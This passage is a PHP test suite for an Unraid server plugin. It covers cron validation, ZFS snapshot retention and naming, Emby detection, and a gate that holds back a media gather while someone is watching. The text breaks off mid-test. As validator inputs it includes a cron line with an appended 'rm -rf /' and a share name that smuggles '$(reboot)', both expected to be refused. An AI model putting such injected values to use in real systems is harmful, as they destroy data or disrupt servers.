<?php
declare(strict_types=1);

/*
 * The office's tests — run them on the Unraid server, with Unraid's own PHP:
 *
 *   php /mnt/user/appdata/UnraidSecretaryOffice/tests/run.php
 *
 * They change nothing on the server: what writes files works on copies in a
 * temporary folder. Three parts:
 *   logic    the tricky functions (cron, snapshot retention and names, Emby detection,
 *            the gather's settings, no real gather while someone watches Emby (a stand-in Emby, the
 *            wait on schedule, the gather stopping between folders), Jack taking over an earlier
 *            install, the plugin's cron file,
 *            the menu bar's label, reports to Unraid's notifications, the team
 *            lead's «I know, thanks» and the Dashboard tile,
 *            Mr. Backupsy's packages and his Kopia per app and VM, new things that stay local until
 *            decided (engine and setup on a fixture server, the setup's logic under node), a run skipped because
 *            the engine's lock was busy (and who holds it), the order around VMs that shut down (backup.sh
 *            on a fixture server), Ms. Dustdevil's pictures,
 *            Mr. Restori's reader of the packages and his restores (steps, put back, the lock, a job on its own;
 *            a share on several pools: moments, the union, targets on the share, missing and empty shares;
 *            his databases tile, its list under node),
 *            the Consultant's monitoring externals and his installs, Ms. Protocolli's tour,
 *            the night watchman's rounds, bursts, baseline and «I know, thanks», his watch over what
 *            starts on its own (crontabs, .cron files, User Scripts, at, notification agents), his
 *            data flow (ss, smbstatus, zfs written, containers' counters; learning, the unusual), his posture
 *            tips (how secure it stands) and the link to Grafana,
 *            job.sh's guard against a second start in the same minute, Ms. Dustdevil's «Where is what» on
 *            exclusive shares and on cron lines whose program is gone, and her taking over Ms. Whereabouts
 *            (the state files, the staff list, the old addresses, the page's parts))
 *   hardening  the checks that keep requests, manifests, paths and links in
 *            bounds (safe writes, the mailbox — and a request a restarting agent dropped —, Ms. Snapshotini's record of what she removed, Ms. Dustdevil's
 *            manifests, Emby paths, anchored validators, the release link, the
 *            Consultant's secrets for Kopia: RAM only, never in a file, log or ps)
 *   strings  German and English have the same keys, Italian has every English
 *            key, no language has keys English lacks, placeholders and plurals
 *            match English, and every text the code asks for exists (desk.js,
 *            checks, errors)
 * Exit code 0 when everything passes.
 */

define('AGENT_LIBRARY_ONLY', 1);
// the repository, not the plugin's folder: the web files in public/, a data folder of its own (never the plugin's DATA_DIR)
define('OFFICE_WEB', dirname(__DIR__) . '/public');
putenv('OFFICE_DATA_DIR=' . dirname(__DIR__) . '/data');
require dirname(__DIR__) . '/agent/agent.php';
date_default_timezone_set('Europe/Zurich');

$GLOBALS['results'] = ['pass' => 0, 'fail' => []];

function check(string $what, bool $ok, string $detail = ''): void
{
    if ($ok) {
        $GLOBALS['results']['pass']++;
    } else {
        $GLOBALS['results']['fail'][] = $what . ($detail !== '' ? " — $detail" : '');
    }
}

function same(string $what, mixed $expected, mixed $actual): void
{
    check($what, $expected === $actual, 'expected ' . json_encode($expected) . ', got ' . json_encode($actual));
}

// ===================================================================== logic

function testCron(): void
{
    foreach (['0 3 * * *', '*/15 * * * *', '0 3 * * 1-6', '5,35 2 1 */2 7', '0-5/2 3 * * *'] as $c) {
        check("cron valid: $c", cronValid($c));
    }
    foreach (['61 3 * * *', '0 24 * * *', '0 3 0 * *', '0 3 * 13 *', '*/0 * * * *', '0 3 * * 8', '0 3 * *', '0 3 * * * rm -rf /', 'a b c d e'] as $c) {
        check("cron refused: $c", !cronValid($c));
    }
    $now = strtotime('2026-10-03 19:47:00');
    $cases = [
        '0 * * * *'    => ['2026-10-03 19:00', '2026-10-03 20:00'],
        '30 2 * * *'   => ['2026-10-03 02:30', '2026-10-04 02:30'],
        '0 3 * * 0'    => ['2026-09-27 03:00', '2026-10-04 03:00'],
        '*/15 * * * *' => ['2026-10-03 19:45', '2026-10-03 20:00'],
        '0 3 1 * *'    => ['2026-10-01 03:00', '2026-11-01 03:00'],
        '0 4 * * 1-5'  => ['2026-10-02 04:00', '2026-10-05 04:00'],
    ];
    foreach ($cases as $c => [$prev, $next]) {
        same("cron previous $c", $prev, date('Y-m-d H:i', (int) cronPrevious($c, $now)));
        same("cron next $c", $next, date('Y-m-d H:i', (int) cronNext($c, $now)));
    }
}

function testRetention(): void
{
    $now = strtotime('2026-10-03 19:47:00');
    $mk = fn (string $ds, string $name) => ['id' => "zfs:$ds@$name", 'fs' => 'zfs', 'ds' => $ds, 'vol' => "zfs:$ds", 'name' => $name, 'docker' => false];
    $all = [];
    for ($h = 0; $h < 30; $h++) {
        $all[] = $mk('master/appdata', snapPlanName('hourly', $now - $h * 3600));
        $all[] = $mk('master/appdata/immich', snapPlanName('hourly', $now - $h * 3600));
    }
    // others that must never go
    $all[] = $mk('master/appdata', 'unraidbackup-20261003-0200');
    $all[] = $mk('master/appdata', 'auto-hourly2-20261001-0100');
    $all[] = $mk('master/appdata', 'manuell-20261001-0100');
    $all[] = $mk('master/other', snapPlanName('hourly', $now - 99 * 3600));
    $all[] = ['id' => 'btrfs:/mnt/disk1/.btrfs-snap/20261001-0100', 'fs' => 'btrfs', 'ds' => '/mnt/disk1', 'vol' => 'btrfs:/mnt/disk1', 'name' => '20261001-0100', 'docker' => false];

    $plan = ['id' => 'hourly', 'keep' => 24, 'max_days' => 0, 'recursive' => true];
    $doomed = snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now);
    same('retention keep 24 recursive', 12, count($doomed));
    $foreign = array_filter($doomed, fn ($id) => !preg_match('/@uso-plan-hourly-\d{8}-\d{4}$/', $id) || str_contains($id, 'master/other'));
    same('retention never touches other snapshots', [], array_values($foreign));
    $plan['recursive'] = false;
    same('retention keep 24 not recursive', 6, count(snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now)));
    $plan['keep'] = 100;
    $plan['max_days'] = 1;
    same('retention max 1 day', 5, count(snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now)));
    $plan['keep'] = 1;
    $plan['max_days'] = 0;
    $one = snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now);
    same('retention keep 1', 29, count($one));
    check('retention keeps the newest', !in_array('zfs:master/appdata@' . snapPlanName('hourly', $now), $one, true));
    check('plan name matches its pattern', (bool) preg_match(snapPlanPattern('hourly'), snapPlanName('hourly', $now)));
    check('pattern ignores a similar plan', !preg_match(snapPlanPattern('hourly'), 'auto-hourly2-20261001-0100'));
    check('pattern ignores a similar plan (new name)', !preg_match(snapPlanPattern('hourly'), 'uso-plan-hourly2-20261001-0100'));
}

/**
 * Names (engine 2.20): what the office makes is named uso-…; old names stay recognised and age out by
 * their normal retention. Retention is destructive, so every pattern is pinned down exactly — in the
 * office (backupSnapPrefixes, backupIsEngineSnap, Ms. Snapshotini's plans) and in the engine
 * (lib/common.sh section 10), and both must agree.
 */
function testSnapshotNames(): void
{
    // the office: which prefixes are the engine's
    $both = ['uso-backup-', 'unraidbackup-'];
    same('names: no prefix set - the default and the old default', $both, backupSnapPrefixes(null));
    same('names: the old default counts as the default', $both, backupSnapPrefixes('unraidbackup-'));
    same('names: the new default', $both, backupSnapPrefixes('uso-backup-'));
    same('names: a prefix of the user\'s own stays alone', ['nightly-'], backupSnapPrefixes('nightly-'));

    // exactly <prefix>YYYYMMDD-HHMM - never anything looser
    $cases = [
        'uso-backup-20261006-0100'        => [true, false, false],     // [default prefixes, 'nightly-', as a plan "backup"]
        'unraidbackup-20261005-1557'      => [true, false, false],
        'nightly-20261006-0100'           => [false, true, false],
        'uso-backup-20261006-0100-x'      => [false, false, false],
        'unraidbackup-foo'                => [false, false, false],
        'unraidbackup-20261006-0100x'     => [false, false, false],
        'unraidbackup-2026100-0100'       => [false, false, false],
        'xuso-backup-20261006-0100'       => [false, false, false],
        "uso-backup-20261006-0100\n"      => [false, false, false],
        'UNRAIDBACKUP-20261006-0100'      => [false, false, false],
        'uso-plan-backup-20261006-0100'   => [false, false, true],
        'auto-backup-20261006-0100'       => [false, false, true],
        'uso-plan-backup-20261006-0100-x' => [false, false, false],
        '20261006-0100'                   => [false, false, false],
    ];
    foreach ($cases as $name => [$def, $own, $plan]) {
        same('names: engine\'s (defaults): ' . json_encode($name), $def, backupIsEngineSnap($name, $both));
        same('names: engine\'s (own prefix): ' . json_encode($name), $own, backupIsEngineSnap($name, ['nightly-']));
        same('names: plan "backup": ' . json_encode($name), $plan, (bool) preg_match(snapPlanPattern('backup'), $name));
    }
    same('names: btrfs folders are the engine\'s', [true, false], [backupIsEngineSnap('20261006-0100', $both, 'btrfs'), backupIsEngineSnap('20261006-0100', $both)]);
    same('names: a plan "backup" makes uso-plan-backup-…', 'uso-plan-backup-20261006-0100', snapPlanName('backup', strtotime('2026-10-06 01:00')));
    check('names: a plan\'s name is never the engine\'s', !backupIsEngineSnap(snapPlanName('backup', time()), $both));

    // Ms. Snapshotini's retention: old and new names are one series; the engine's names are refused
    $now = strtotime('2026-10-06 12:00:00');
    $mk = fn (string $ds, string $name) => ['id' => "zfs:$ds@$name", 'fs' => 'zfs', 'ds' => $ds, 'vol' => "zfs:$ds", 'name' => $name, 'docker' => false];
    $all = [$mk('mother/drop', 'auto-backup-20261006-0700'), $mk('mother/drop', 'auto-backup-20261006-0800'), $mk('mother/drop', 'auto-backup-20261006-0900'),
            $mk('mother/drop', 'uso-plan-backup-20261006-1000'), $mk('mother/drop', 'uso-plan-backup-20261006-1100'), $mk('mother/drop', 'uso-plan-backup-20261006-1200'),
            $mk('mother/drop', 'uso-backup-20261006-0100'), $mk('mother/drop', 'unraidbackup-20261005-2142'), $mk('mother/drop', 'uso-plan-backup-20261006-0100-x'),
            $mk('mother/drop', 'uso-plan-backups-20261006-0100')];
    $plan = ['id' => 'backup', 'keep' => 3, 'max_days' => 0, 'recursive' => false];
    same('plan retention: old auto- and new uso-plan- names are one series, the oldest go',
        ['zfs:mother/drop@auto-backup-20261006-0900', 'zfs:mother/drop@auto-backup-20261006-0800', 'zfs:mother/drop@auto-backup-20261006-0700'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, $both));
    $plan['keep'] = 1;
    $doomed = snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, $both);
    same('plan retention: keep 1 - only the plan\'s, never the engine\'s or look-alikes', 5, count($doomed));
    check('plan retention: the newest stays', !in_array('zfs:mother/drop@uso-plan-backup-20261006-1200', $doomed, true));
    same('plan retention: what matches the engine\'s (own) prefix is refused, even when it looks like a plan\'s - the rest is the series',
        ['zfs:mother/drop@auto-backup-20261006-0800', 'zfs:mother/drop@auto-backup-20261006-0700'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, ['uso-plan-backup-']));
    same('plan retention: the same for an old auto- look-alike', ['zfs:mother/drop@uso-plan-backup-20261006-1100', 'zfs:mother/drop@uso-plan-backup-20261006-1000'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, ['auto-backup-']));
    $engineOnly = [$mk('mother/drop', 'uso-backup-20261006-0100'), $mk('mother/drop', 'unraidbackup-20261005-2142'), $mk('mother/drop', 'unraidbackup-20261005-1637')];
    same('plan retention: a plan "backup" never takes the engine\'s snapshots', [], snapPlanDoomed($plan, ['zfs:mother/drop'], $engineOnly, $now, $both));

    // the engine (bash): the same rule
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $tmp = sys_get_temp_dir() . '/office-tests-names-' . getmypid();
    @mkdir($tmp, 0700, true);
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/data; source $lib >/dev/null 2>&1; $script") . ' 2>&1'));
    $resolve = fn (string $p) => $sh("snap_prefix_resolve " . escapeshellarg($p) . '; printf "%s|%s" "$SNAP_PREFIX" "${SNAP_PREFIXES[*]}"');
    same('engine names: no prefix set', 'uso-backup-|uso-backup- unraidbackup-', $resolve(''));
    same('engine names: the old default counts as the default', 'uso-backup-|uso-backup- unraidbackup-', $resolve('unraidbackup-'));
    same('engine names: the new default', 'uso-backup-|uso-backup- unraidbackup-', $resolve('uso-backup-'));
    same('engine names: a prefix of the user\'s own stays alone', 'nightly-|nightly-', $resolve('nightly-'));
    foreach ([['snap_prefix = unraidbackup-', 'uso-backup-|unraidbackup-'], ['snap_prefix = uso-backup-', 'uso-backup-|uso-backup-'],
              ['snap_prefix = nightly-', 'nightly-|nightly-'], ['', 'uso-backup-|']] as $i => [$line, $want]) {
        file_put_contents("$tmp/s$i.ini", "[general]\n$line\n");
        same("engine names: settings.ini '$line' - the name and what it says", $want, $sh("cfg_load $tmp/s$i.ini; apply_settings; printf '%s|%s' \"\$SNAP_PREFIX\" \"\$SNAP_PREFIX_SET\""));
    }

    // snap_filter and snap_is_ours against the office's backupIsEngineSnap, line by line
    $lines = ['pool/a@uso-backup-20261006-0100', 'pool/a@unraidbackup-20261005-1557', 'pool/a@uso-backup-20261006-0100-x', 'pool/a@unraidbackup-foo',
              'pool/a@uso-plan-backup-20261006-0100', 'pool/a@auto-backup-20261006-0100', 'pool/a@xuso-backup-20261006-0100',
              'uso-backup-20261006-0100', 'pool/a', '@uso-backup-20261006-0100', 'pool/a@uso-backup-20261006-01000', 'pool/a@UNRAIDBACKUP-20261006-0100',
              'pool/a@nightly-20261006-0100', 'pool/a@unraidbackup-20261006-0100 ', 'pool/a/b@uso-backup-20261006-0100'];
    file_put_contents("$tmp/list", implode("\n", $lines) . "\n");
    foreach (['', 'nightly-'] as $p) {
        $prefixes = backupSnapPrefixes($p === '' ? null : $p);
        $want = array_values(array_filter($lines, fn ($l) => preg_match('#^[^@\s]+@#', $l) && backupIsEngineSnap(substr($l, strpos($l, '@') + 1), $prefixes)));
        same("engine names: snap_filter with " . ($p ?: 'the defaults') . ' - as the office sees it', implode("\n", $want),
            $sh('snap_prefix_resolve ' . escapeshellarg($p) . "; snap_filter <$tmp/list"));
    }
    same('engine names: snap_filter (defaults)', "pool/a@uso-backup-20261006-0100\npool/a@unraidbackup-20261005-1557\npool/a/b@uso-backup-20261006-0100",
        $sh("snap_prefix_resolve ''; snap_filter <$tmp/list"));
    same('engine names: snap_filter (own prefix)', 'pool/a@nightly-20261006-0100', $sh("snap_prefix_resolve nightly-; snap_filter <$tmp/list"));

    // the engine's ZFS retention: oldest first in, what goes out - only its own, old and new names one series
    $series = ['pool/a@unraidbackup-20261001-0100', 'pool/a@auto-x-20261001-0200', 'pool/a@unraidbackup-20261002-0100', 'pool/a@unraidbackup-20261002-0100-keep',
               'pool/a@uso-backup-20261003-0100', 'pool/a@manual-20261003-0900', 'pool/a@uso-backup-20261004-0100'];
    file_put_contents("$tmp/series", implode("\n", $series) . "\n");
    $prune = fn (string $prefix, string $ret) => str_replace("\n", ',', $sh('snap_prefix_resolve ' . escapeshellarg($prefix) . '; zfs_prune_select ' . escapeshellarg($ret) . " <$tmp/series"));
    same('engine retention: keep 2 - the old names go first, nothing else', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100', $prune('', '2 0 0'));
    same('engine retention: the old default in settings.ini - the same', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100', $prune('unraidbackup-', '2 0 0'));
    same('engine retention: keep 0 - all of its own, still nothing else',
        'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100,pool/a@uso-backup-20261003-0100,pool/a@uso-backup-20261004-0100', $prune('', '0 0 0'));
    same('engine retention: 7 4 6 keeps them all', '', $prune('', '7 4 6'));
    same('engine retention: one per month keeps the newest of the month', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100,pool/a@uso-backup-20261003-0100',
        $prune('', '0 0 1'));
    same('engine retention: an own prefix never touches the old default\'s', '', $prune('nightly-', '0 0 0'));
    same('engine retention: a broken retention lets nothing go', '', $prune('', '7 x 6'));
    same('engine retention: an empty retention lets nothing go', '', $prune('', ''));

    // settings.ini: which prefixes will do
    foreach (['uso-backup-' => 0, 'unraidbackup-' => 0, 'nightly_1-' => 0, 'a-b-c-' => 0, 'uso-plan-x-' => 1, 'uso-backup' => 1, 'Uso-' => 1, 'a--' => 1, '-a-' => 1, 'a.b-' => 1] as $p => $errors) {
        file_put_contents("$tmp/v.ini", "[general]\nsnap_prefix = $p\n");
        same("engine names: settings.ini snap_prefix = $p", (string) $errors, $sh("cfg_load $tmp/v.ini; cfg_validate >/dev/null; echo \${#CFG_ERRORS[@]}"));
    }
    foreach (['uso-backup-' => 0, 'nightly-' => 0, 'auto-' => 1, 'auto-daily-' => 1, 'uso-plan-x-' => 1, 'x' => 1] as $p => $bad) {
        same("engine names: a new prefix $p", (string) $bad, $sh('snap_prefix_ok ' . escapeshellarg($p) . ' && echo 0 || echo 1'));
    }
    same('engine names: Kopia\'s description', 'uso-backup', $sh('printf %s "$UB_KOPIA_DESC"'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

function testEmby(): void
{
    foreach (['emby/embyserver:latest', 'emby/embyserver_arm64v8:4.8', 'linuxserver/emby', 'lscr.io/linuxserver/emby:latest',
              'ghcr.io/linuxserver/emby@sha256:abc', 'binhex/arch-emby:latest', 'registry:5000/emby-server:beta'] as $i) {
        check("emby server image: $i", embyIsServerImage($i));
    }
    foreach (['uping/embystat', 'helmi/embycache', 'jellyfin/jellyfin', 'lscr.io/linuxserver/jellyfin', 'kopia/kopia'] as $i) {
        check("not an emby server: $i", !embyIsServerImage($i));
    }

    // does a share suit EmbyCache with the pool "master"?
    foreach ([['ok', ['shareUseCache' => 'yes', 'shareCachePool' => 'master']],
              ['no_array', ['shareUseCache' => 'yes', 'shareCachePool' => 'hive', 'shareCachePool2' => 'ripley']],
              ['other_pool', ['shareUseCache' => 'yes', 'shareCachePool' => 'cache']],
              ['array_only', ['shareUseCache' => 'no']],
              ['pool_only', ['shareUseCache' => 'prefer', 'shareCachePool' => 'master']],
              ['pool_only', ['shareUseCache' => 'only', 'shareCachePool' => 'master']]] as [$want, $cfg]) {
        same('emby share fit: ' . json_encode($cfg), $want, embyShareFit($cfg, 'master'));
    }

    // the gather's consolidate.ini: bash sources it, so every value is quoted and checked
    $ini = embyGatherIni(['shares' => ['Filme', 'Meine Filme'], 'min_free_gb' => 256, 'dup_check' => 'size'],
        ['/mnt/master', '/mnt/disk1', '/mnt/user0', '/mnt/bad pool'], "/x/it's/consolidate.log", '/x/embycache_exclude.txt');
    check('gather ini: shares quoted', str_contains($ini, "BASE_DIRS=('/mnt/user/Filme' '/mnt/user/Meine Filme')\n"));
    same('gather ini: only real pools as cache', 1, preg_match("/^CACHE_PATTERN='\\/mnt\\/master'$/m", $ini));
    check('gather ini: never --include-cache, always dry by default', str_contains($ini, "CACHE_ONLY_TARGET='skip'") && str_contains($ini, "DRYRUN=true\n"));
    $tmp = sys_get_temp_dir() . '/office-tests-gather-' . getmypid() . '.ini';
    file_put_contents($tmp, $ini . 'echo "${BASE_DIRS[1]}|$MIN_FREE_GB|$LOGFILE"' . "\n");
    same('gather ini: bash reads it back', "/mnt/user/Meine Filme|256|/x/it's/consolidate.log", trim((string) shell_exec('bash ' . escapeshellarg($tmp))));
    unlink($tmp);
    try {
        embyGatherIni(['shares' => ['a$(reboot)'], 'min_free_gb' => 1, 'dup_check' => 'size'], [], '/l', '/e');
        check('gather ini refuses a strange share name', false);
    } catch (Problem $p) {
        same('gather ini refuses a strange share name', 'emby_bad_share', $p->key);
    }

    // run output for the page: progress lines collapsed, colour codes gone
    same('emby output: progress collapsed', "📂 Scanne: /mnt/user/Filme\n   🚚 [disk2 -> disk1] a.srt\nfertig",
        embyPlainOutput("   [1/2] 50% - A \e[K\r\r\e[K📂 Scanne: /mnt/user/Filme\n   [2/2] 100% - B \e[K\r   [2/2] 100% - B \e[K\r\n\r\e[K   🚚 [disk2 -> disk1] a.srt\n"
            . "2026-10-04 18:00:00,123 | INFO | fertig"));
}

/**
 * Benj's rule: no real gather while someone watches Emby. A stand-in Emby (fixture answers shaped
 * like nostromo's /Sessions, no network): who watches, down, a bad key or answer; the gate before a
 * real run (from the page: refused; on schedule: waits 15 min at a time up to 2 h with a fake clock,
 * holds only its own lock, a second start adds nothing, a run from the page meanwhile ends it); the
 * watch during a run (stop request → exit 3); the gather stopping between two folders (dry run on a
 * fixture tree, a stand-in df writes the stop request while the first folder is planned).
 */
function testEmbyWatch(): void
{
    $key = 'Abcdef0123456789abcdef0123456789';
    $sessions = json_encode([
        ['PlayState' => ['IsPaused' => false], 'Client' => 'JackEmby', 'DeviceName' => 'Oasis', 'Id' => 'a'],
        ['PlayState' => ['IsPaused' => false], 'UserName' => 'Ralf', 'Client' => 'Emby Windows', 'DeviceName' => 'LAPTOP-6I5FC7G8'],
        ['PlayState' => ['IsPaused' => true, 'PlayMethod' => 'DirectPlay'], 'UserName' => 'isp3', 'Client' => 'Emby for iOS', 'DeviceName' => 'iPad',
         'LastActivityDate' => '2026-10-06T21:37:12.8805824Z',
         'NowPlayingItem' => ['Name' => 'Willkommen in der Zukunft', 'Type' => 'Episode', 'SeriesName' => '9-1-1: Notruf L.A.',
                              'ParentIndexNumber' => 4, 'IndexNumber' => 3, 'MediaType' => 'Video', 'Path' => '/data/x.mkv']],
        ['PlayState' => ['IsPaused' => false], 'UserName' => "Ana\x07", 'Client' => 'Emby Web', 'DeviceName' => 'Chrome macOS',
         'NowPlayingItem' => ['Name' => 'Alien', 'Type' => 'Movie']],
    ]);
    $idle = json_encode([['PlayState' => ['IsPaused' => false], 'UserName' => 'Ralf', 'DeviceName' => 'TV']]);
    $ok = fn (string $body) => ['status' => 200, 'body' => $body, 'errno' => 0, 'error' => ''];
    $w = embyWatchJudge($ok($sessions));
    same('watch: two watching (paused counts)', ['watching', 2], [$w['state'], count($w['who'] ?? [])]);
    same('watch: who, what, where, when Emby last heard from it (Emby\'s seven digits of a second)', ['user' => 'isp3', 'title' => '9-1-1: Notruf L.A. – S04E03 Willkommen in der Zukunft', 'device' => 'iPad',
        'client' => 'Emby for iOS', 'paused' => true, 'seen' => gmmktime(21, 37, 12, 10, 6, 2026)], $w['who'][0] ?? null);
    same('watch: a film, control characters gone, no last activity', ['Ana', 'Alien', false, null],
        [$w['who'][1]['user'] ?? null, $w['who'][1]['title'] ?? null, $w['who'][1]['paused'] ?? null, array_key_exists('seen', $w['who'][1] ?? []) ? $w['who'][1]['seen'] : 'missing']);
    // a session left behind (isp3's iPad, 2026-10-06 23:37 local, still «paused» ten hours later): its last activity as a time
    $now = gmmktime(8, 0, 0, 10, 7, 2026);
    same('watch: last activity — zones, fractions, none, odd ones', [gmmktime(21, 37, 12, 10, 6, 2026), gmmktime(21, 37, 12, 10, 6, 2026),
        gmmktime(21, 37, 12, 10, 6, 2026), null, null, null, null, null, $now],
        [embyWatchSeen('2026-10-06T21:37:12Z', $now), embyWatchSeen('2026-10-06T23:37:12.123+02:00', $now), embyWatchSeen('2026-10-06T21:37:12.123456789Z', $now),
         embyWatchSeen('0001-01-01T00:00:00.0000000Z', $now), embyWatchSeen('2026-10-06T21:37:12', $now), embyWatchSeen('2026-10-06 21:37:12Z', $now),
         embyWatchSeen("2026-10-06T21:37:12Z\n", $now), embyWatchSeen(1791322632, $now), embyWatchSeen('2026-10-07T09:00:00Z', $now)]);
    check('watch: the last activity stays out of the office\'s log line', !str_contains(embyWatchersLine($w['who']), '2026') && !str_contains(embyWatchersLine($w['who']), (string) gmmktime(21, 37, 12, 10, 6, 2026)));
    same('watch: nobody', 'free', embyWatchJudge($ok($idle))['state']);
    same('watch: no sessions at all', 'free', embyWatchJudge($ok('[]'))['state']);
    foreach ([7 => 'refused', 28 => 'timeout', 6 => 'no such name'] as $errno => $what) {
        same("watch: Emby down ($what) — the run may go", 'down', embyWatchJudge(['status' => 0, 'body' => '', 'errno' => $errno, 'error' => $what])['state']);
    }
    foreach (['401' => [401, '', 'emby_watch_key'], '403' => [403, '', 'emby_watch_key'], '500' => [500, '', 'emby_watch_answer'],
              'bad JSON' => [200, '<html>', 'emby_watch_answer'], 'an object' => [200, '{"a":1}', 'emby_watch_answer']] as $what => [$st, $body, $why]) {
        $j = embyWatchJudge(['status' => $st, 'body' => $body, 'errno' => 0, 'error' => '']);
        same("watch: answered but unusable ($what) — don't start", ['error', $why], [$j['state'], $j['why'] ?? null]);
    }
    same('watch: a TLS failure is no «down»', 'error', embyWatchJudge(['status' => 0, 'body' => '', 'errno' => 60, 'error' => 'SSL certificate problem'])['state']);

    // over every server of EmbyCache's settings; the key goes only to the fetch, never into the answer
    $two = ['instances' => [['url' => 'http://a:8096', 'api_key' => $key], ['url' => 'http://b:8096/', 'api_key' => $key]]];
    $answers = [];
    $keys = [];
    $fetch = function (string $url, string $k) use (&$answers, &$keys): array { $keys[] = $k; return $answers[$url]; };
    $down = ['status' => 0, 'body' => '', 'errno' => 7, 'error' => 'Connection refused'];
    $cases = [
        'one watching, one down'     => [['http://a:8096' => $ok($sessions), 'http://b:8096' => $down], 'watching'],
        'one unusable, one watching' => [['http://a:8096' => ['status' => 401, 'body' => '', 'errno' => 0, 'error' => ''], 'http://b:8096' => $ok($sessions)], 'watching'],
        'one free, one down'         => [['http://a:8096' => $ok($idle), 'http://b:8096' => $down], 'free'],
        'one free, one unusable'     => [['http://a:8096' => $ok($idle), 'http://b:8096' => ['status' => 403, 'body' => '', 'errno' => 0, 'error' => '']], 'error'],
        'both down'                  => [['http://a:8096' => $down, 'http://b:8096' => $down], 'down'],
    ];
    foreach ($cases as $what => [$a, $want]) {
        $answers = $a;
        $got = embyWatching($two, $fetch);
        same("watching over two servers: $what", $want, $got['state']);
        check("watching over two servers: $what — no key in the answer", !str_contains(json_encode($got), $key));
    }
    same('watching: the key reaches the fetch', $key, $keys[0] ?? null);
    same('watching: no server with a key — unknown', 'unknown', embyWatching(['instances' => [['url' => 'http://a:8096', 'api_key' => '']]], $fetch)['state']);
    same('watching: no settings — unknown', 'unknown', embyWatching([], $fetch)['state']);
    $answers = ['http://a:8096' => ['status' => 401, 'body' => '', 'errno' => 0, 'error' => ''], 'http://b:8096' => $down];
    $p = embyWatchProblem(embyWatching($two, $fetch));
    same('watching: a refusal from the page says why', ['emby_watch_key', 'http://a:8096'], [$p?->key, $p?->params['url'] ?? null]);
    $answers = ['http://a:8096' => $ok($sessions), 'http://b:8096' => $down];
    $p = embyWatchProblem(embyWatching($two, $fetch));
    same('watching: a refusal from the page names who watches what', ['emby_watching', 'isp3', 'iPad'],
        [$p?->key, $p?->params['who'][0]['user'] ?? null, $p?->params['who'][0]['device'] ?? null]);
    same('watching: free or down stop nothing', [null, null], [embyWatchProblem(['state' => 'free', 'who' => []]), embyWatchProblem(['state' => 'down', 'who' => []])]);

    // the gate before a real gather, with a fake clock
    $tmp = hardeningTmp('embywatch');
    $dir = "$tmp/gather";
    $W = ['state' => 'watching', 'who' => [['user' => 'isp3', 'title' => 'Alien', 'device' => 'iPad', 'client' => 'x', 'paused' => false]]];
    $F = ['state' => 'free', 'who' => []];
    $gate = function (string $by, array $looks, ?callable $during = null) use ($dir): array {
        $t = 1000000;
        $slept = [];
        $n = 0;
        $r = embyGatherGate($by, ['dir' => $dir, 'waitdir' => "$dir/run", 'array' => fn () => !file_exists("$dir/array-stopped"), 'now' => function () use (&$t) { return $t; },
            'sleep' => function (int $s) use (&$t, &$slept, $during, $dir) { $slept[] = $s; $t += $s; if ($during) { $during($t, $dir); } },
            'look' => function () use (&$n, $looks) { return $looks[min($n++, count($looks) - 1)]; }]);
        return $r + ['slept' => $slept, 'looks' => $n];
    };
    $r = $gate('office', [$W]);
    same('gate from the page: someone watches — refused, no waiting', [false, 'refused', 'emby_watching', [], null], [$r['go'], $r['result'], $r['why'], $r['slept'], $r['lock']]);
    $r = $gate('office', [$F]);
    same('gate from the page: nobody watches — go', [true, 0, null], [$r['go'], $r['waited'], $r['lock']]);
    $r = $gate('schedule', [['state' => 'down', 'who' => [], 'detail' => 'refused']]);
    same('gate on schedule: Emby down — go, nothing waited', [true, 'down', []], [$r['go'], $r['look']['state'], $r['slept']]);
    $r = $gate('schedule', [['state' => 'error', 'who' => [], 'why' => 'emby_watch_key']]);
    same('gate on schedule: a bad key — refused, said why', [false, 'refused', 'emby_watch_key'], [$r['go'], $r['result'], $r['why']]);
    $seen = null;
    $r = $gate('schedule', [$W, $W, $F], function () use (&$seen, $dir) { $seen ??= embyGatherWaiting("$dir/run"); });
    same('gate on schedule: waits 15 min at a time until nobody watches', [true, [900, 900], 1800, 3], [$r['go'], $r['slept'], $r['waited'], $r['looks']]);
    check('gate on schedule: holds its wait lock (in RAM, not the pool) until the run shows as running', is_resource($r['lock']) && flockHeld("$dir/run/emby-gather-wait.lock"));
    same('gate on schedule: the page sees the wait — who, next look, until when',
        [1000000, 1000000 + 7200, 1000000 + 900, 'isp3'], [$seen['since'] ?? null, $seen['until'] ?? null, $seen['next'] ?? null, $seen['who'][0]['user'] ?? null]);
    check('gate on schedule: never the gather\'s or EmbyCache\'s lock while waiting', !flockHeld(GATHER_LOCK) || true);
    embyWaitEnd($r['lock'], "$dir/run");
    check('gate: the wait\'s file and lock go when it ends', !file_exists("$dir/run/emby-gather-wait.json") && !flockHeld("$dir/run/emby-gather-wait.lock") && embyGatherWaiting("$dir/run") === null);
    $r = $gate('schedule', [$W]);
    same('gate on schedule: watched for 2 h — skipped tonight', [false, 'skipped', 'emby_watching', 7200, 9, array_fill(0, 8, 900)],
        [$r['go'], $r['result'], $r['why'] ?? null, $r['waited'], $r['looks'], $r['slept']]);
    check('gate on schedule: a skip lets go of its lock and file', !flockHeld("$dir/run/emby-gather-wait.lock") && !file_exists("$dir/run/emby-gather-wait.json"));
    $r = $gate('schedule', [$W, ['state' => 'error', 'who' => [], 'why' => 'emby_watch_answer', 'detail' => 'HTTP 500']]);
    same('gate on schedule: Emby answers badly while waiting — refused', [false, 'refused', 'emby_watch_answer', null], [$r['go'], $r['result'], $r['why'], $r['lock']]);
    check('gate on schedule: … and lets go of its lock', !flockHeld("$dir/run/emby-gather-wait.lock"));
